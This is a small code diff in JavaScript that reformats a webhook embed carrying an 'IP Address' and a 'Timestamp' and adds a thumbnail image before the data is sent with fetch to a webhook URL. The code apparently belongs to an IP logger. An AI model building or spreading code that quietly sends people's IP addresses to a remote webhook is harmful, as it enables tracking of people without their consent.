@@ -66,13 +66,16 @@
         fields: [
           {
             name: 'IP Address',
-            value: ip,
+            value: '```' + ip + '```',
           },
           {
             name: 'Timestamp',
-            value: new Date().toLocaleString(),
+            value: '```' + new Date().toLocaleString() + '```',
           },
         ],
+        image: {
+            url: 'https://i.ibb.co/Mh02pmZ/rounded.png',
+        },
       };
 
       fetch(webhookURL, {
